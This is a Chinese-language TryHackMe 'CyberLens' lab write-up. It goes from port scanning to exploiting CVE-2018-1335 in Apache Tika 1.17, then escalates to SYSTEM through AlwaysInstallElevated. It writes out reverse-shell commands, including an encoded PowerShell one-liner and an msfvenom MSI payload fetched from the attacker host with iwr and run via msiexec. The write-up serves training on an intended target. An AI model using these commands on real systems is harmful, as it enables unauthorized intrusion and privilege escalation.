## 概述

來源: [tryhackme](https://tryhackme.com/room/cyberlensp6)  
題目: CyberLens  
難度: easy  
靶機: `10.10.176.146` 
> 靶機 IP 有變動因為有重啟過機器

## Enum

### /etc/hosts   
```bash
┌──(kali㉿kali)-[~/tryhackme/cyberlens]
└─$ cat /etc/hosts                                        
...
10.10.78.189    cyberlens.thm
...
```

### nmap
```bash
nmap -p- -v cyberlens.thm -T4

PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49674/tcp open  unknown
61777/tcp open  unknown
```

```bash
nmap -p 80,135,139,445,3389,5985,7680,47001,49664,49665,49666,49667,49668,49669,49670,49674,61777 -sV -sC -v cyberlens.thm

PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-13T06:53:13
| Not valid after:  2026-05-15T06:53:13
| MD5:   cc3f:56ef:5581:aaf0:e1e1:5775:f89a:82d4
|_SHA-1: e10f:4208:efd1:87aa:5b3c:dca8:a278:563e:db96:4de5
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-14T07:25:34+00:00
|_ssl-date: 2025-11-14T07:25:43+00:00; 0s from scanner time.
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  closed pando-pub
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49670/tcp open   msrpc         Microsoft Windows RPC
49674/tcp open   msrpc         Microsoft Windows RPC
61777/tcp open   http          Jetty 8.y.z-SNAPSHOT
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
| http-methods: 
|   Supported Methods: POST GET PUT OPTIONS HEAD
|_  Potentially risky methods: PUT
|_http-title: Welcome to the Apache Tika 1.17 Server
|_http-cors: HEAD GET
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-14T07:25:33
|_  start_date: N/A

```

### feroxbuster
```bash
┌──(kali㉿kali)-[~/tryhackme/cyberlens]
└─$ feroxbuster -u http://cyberlens.thm/ -w ~/wordlists/directories.txt -t 100 -C 404 

                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cyberlens.thm/
 🚩  In-Scope Url          │ cyberlens.thm
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/kali/wordlists/directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      614l     1154w    11838c http://cyberlens.thm/css/style.css
200      GET      189l      482w     6254c http://cyberlens.thm/about.html
200      GET       85l      128w     1389c http://cyberlens.thm/css/responsive.css
200      GET        3l     1276w    88147c http://cyberlens.thm/js/jquery-3.4.1.min.js
301      GET        7l       20w      236c http://cyberlens.thm/Images => http://cyberlens.thm/Images/
200      GET        9l       41w     2465c http://cyberlens.thm/images/s-4.png
200      GET        3l        6w      469c http://cyberlens.thm/images/next-white.png
200      GET        5l       10w      275c http://cyberlens.thm/images/prev.png
200      GET        9l       25w     1255c http://cyberlens.thm/images/envelope.png
200      GET        4l        9w      288c http://cyberlens.thm/images/next.png
200      GET    10038l    19587w   192348c http://cyberlens.thm/css/bootstrap.css
200      GET      149l      630w    53431c http://cyberlens.thm/images/client.jpg
200      GET        9l       31w     2492c http://cyberlens.thm/Images/s-3.png
200      GET        4l       20w     1337c http://cyberlens.thm/Images/s-2.png
200      GET        6l       17w     1553c http://cyberlens.thm/Images/s-1.png
200      GET        6l       20w     1360c http://cyberlens.thm/Images/location-o.png
200      GET        6l       22w     1052c http://cyberlens.thm/Images/location.png
200      GET       26l      320w    14207c http://cyberlens.thm/Images/menu.png
200      GET     1721l     4067w   163071c http://cyberlens.thm/images/body_bg.jpg
200      GET      226l     1292w    95078c http://cyberlens.thm/images/photo-1562813733-b31f71025d54.webp
200      GET        4l       15w      899c http://cyberlens.thm/Images/search-icon.png
200      GET        9l       25w     1255c http://cyberlens.thm/Images/envelope.png
200      GET        4l       10w      773c http://cyberlens.thm/Images/quote.png
200      GET      149l      630w    53431c http://cyberlens.thm/Images/client.jpg
200      GET       82l      542w    56157c http://cyberlens.thm/Images/contact-img.jpg
200      GET      226l     1292w    95078c http://cyberlens.thm/Images/photo-1562813733-b31f71025d54.webp
200      GET      177l      769w    79030c http://cyberlens.thm/Images/offer-img.jpg
200      GET     1721l     4067w   163071c http://cyberlens.thm/Images/body_bg.jpg
200      GET     1313l     7384w   563817c http://cyberlens.thm/Images/about-img.png
200      GET     1313l     7384w   563817c http://cyberlens.thm/images/about-img.png
200      GET     1668l    15071w  1048299c http://cyberlens.thm/images/about-img.jpg
200      GET     1581l    10501w   775677c http://cyberlens.thm/Images/hero-bg1.jpg
200      GET     1581l    10501w   775677c http://cyberlens.thm/images/hero-bg1.jpg
200      GET     2344l    20516w  1929763c http://cyberlens.thm/Images/hero-bg.jpg
200      GET      233l      660w     8780c http://cyberlens.thm/
200      GET     1668l    15071w  1048299c http://cyberlens.thm/Images/about-img.jpg
200      GET        3l        6w      469c http://cyberlens.thm/Images/next-white.png
200      GET       10l       43w     2023c http://cyberlens.thm/Images/call.png
200      GET        5l       10w      275c http://cyberlens.thm/Images/prev.png
200      GET        3l        9w      440c http://cyberlens.thm/Images/prev-white.png
200      GET        4l        9w      288c http://cyberlens.thm/Images/next.png
200      GET        9l       41w     2465c http://cyberlens.thm/Images/s-4.png
200      GET       14l       48w     3837c http://cyberlens.thm/Images/logo.png
200      GET       10l       42w     2704c http://cyberlens.thm/Images/call-o.png
200      GET        7l       29w     1606c http://cyberlens.thm/Images/envelope-o.png
301      GET        7l       20w      233c http://cyberlens.thm/css => http://cyberlens.thm/css/
200      GET      599l      923w    10931c http://cyberlens.thm/css/style.scss
301      GET        7l       20w      232c http://cyberlens.thm/js => http://cyberlens.thm/js/
200      GET       36l       83w     1081c http://cyberlens.thm/js/image-extractor.js
[####################] - 83s     9583/9583    0s      found:49      errors:1081   
[####################] - 73s     4749/4749    65/s    http://cyberlens.thm/ 
[####################] - 7s      4749/4749    635/s   http://cyberlens.thm/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s      4749/4749    688/s   http://cyberlens.thm/Images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 68s     4749/4749    70/s    http://cyberlens.thm/cgi-bin/ 
[####################] - 7s      4749/4749    634/s   http://cyberlens.thm/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s      4749/4749    634/s   http://cyberlens.thm/js/ => Directory listing (add --scan-dir-listings to scan) 
```

## initial access - CVE-2018-1335

發現 61777 port 使用 `Apache Tika 1.17 Server`  

感謝大神提供  
https://github.com/canumay/cve-2018-1335/blob/main/exploit.py  
或參考 [CVE-2018-1335.py](CVE-2018-1335.py)  

### 測試 POC 的 cmd 是否能成功執行
```bash
┌──(kali㉿kali)-[~/tryhackme/cyberlens]
└─$ python3 CVE-2018-1335.py cyberlens.thm 61777 "ping -n 2 10.4.11.38"                    
```
```bash
┌──(kali㉿kali)-[~/tools]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:44:26.551458 IP cyberlens.thm > 10.4.11.38: ICMP echo request, id 1, seq 23, length 40
13:44:26.551477 IP 10.4.11.38 > cyberlens.thm: ICMP echo reply, id 1, seq 23, length 40
13:44:27.735260 IP cyberlens.thm > 10.4.11.38: ICMP echo request, id 1, seq 24, length 40
13:44:27.735285 IP 10.4.11.38 > cyberlens.thm: ICMP echo reply, id 1, seq 24, length 40
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel

```
ping 有回應表示 cmd 成功  

### reverse shell
這次直接改成 reverse shell cmd 
使用 Powershell #3 (base64) 可參考此大神作的網站使用  
https://www.revshells.com/  
```bash
└─$ python3 CVE-2018-1335.py cyberlens.thm 61777 "powershell -e JABj...
```
```bash
┌──(kali㉿kali)-[~/tools]
└─$ nc -nvlp 4444            
listening on [any] 4444 ...
connect to [10.4.11.38] from (UNKNOWN) [10.10.35.174] 49861
whoami
cyberlens\cyberlens
PS C:\Windows\system32> 
```
成功取得 shell  

感謝大神分享
https://medium.com/@nr_4x4/thm-cyberlens-ed5cfed4c528

### flag
```bash
PS C:\Windows\system32> Get-ChildItem -Path C:\Users\* -Filter user.txt -Recurse -ErrorAction SilentlyContinue -Force | Select-Object -ExpandProperty FullName

C:\Users\CyberLens\Desktop\user.txt
C:\Users\desktop.ini
PS C:\Windows\system32> PS C:\Windows\system32> type C:\Users\CyberLens\Desktop\user.txt

THM{...}
```

## Privilege Escalation
https://github.com/itm4n/PrivescCheck/releases/tag/2025.11.09-1

靶機下載並執行
```bash
PS C:\Users\CyberLens\Desktop> iwr 10.4.11.38/PrivescCheck.ps1 -outfile PrivescCheck.ps1
```
```bash
PS C:\Users\CyberLens\Desktop> . .\PrivescCheck.ps1; Invoke-PrivescCheck
????????????????????????????????????????????????????????????????
? CATEGORY ? TA0043 - Reconnaissance                           ?
? NAME     ? User - Identity                                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about the current user (name, domain name)   ?
...
```
### AlwaysInstallElevated
發現 AlwaysInstallElevated
```bash
????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - MSI AlwaysInstallElevated         ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the 'AlwaysInstallElevated' policy is enabled  ?
? system-wide and for the current user. If so, the current     ?
? user may install a Windows Installer package with elevated   ?
? (SYSTEM) privileges.                                         ?
????????????????????????????????????????????????????????????????


LocalMachineKey   : HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
LocalMachineValue : AlwaysInstallElevated
LocalMachineData  : 1
CurrentUserKey    : HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
CurrentUserValue  : AlwaysInstallElevated
CurrentUserData   : 1
Description       : AlwaysInstallElevated is enabled in both HKLM and HKCU.



[*] Status: Vulnerable - Severity: High - Execution time: 00:00:00.010
```

### reverse shell
```bash
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.11.38 LPORT=3333 -f msi  -o pig.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
Saved as: pig.msi

```
> 注意這裡用 `windows/shell_reverse_tcp` 

```bash                                                          
┌──(kali㉿kali)-[~/tools]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.35.174 - - [18/Nov/2025 13:33:14] "GET /pig.msi HTTP/1.1" 200 -
^C
```

靶機下載檔案
```bash
PS C:\Users\CyberLens\Desktop> iwr 10.4.11.38/pig.msi -outfile pig.msi
PS C:\Users\CyberLens\Desktop> dir


    Directory: C:\Users\CyberLens\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   
-a----       11/18/2025   5:25 AM         159744 pig.msi                                                               
-a----       11/18/2025   5:13 AM         215258 PrivescCheck.ps1                                                      
-a----         6/6/2023   7:54 PM             25 user.txt   
```
先監聽後執行
```bash
PS C:\Users\CyberLens\Desktop> msiexec /quiet /qn /i pig.msi
```
成功取得 system shell
```bash
┌──(kali㉿kali)-[~/tools]
└─$ nc -nvlp 3333
listening on [any] 3333 ...
connect to [10.4.11.38] from (UNKNOWN) [10.10.35.174] 49885
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### flag
```bash
C:\Users\Administrator\Desktop>type admin.txt
type admin.txt
THM{...}
```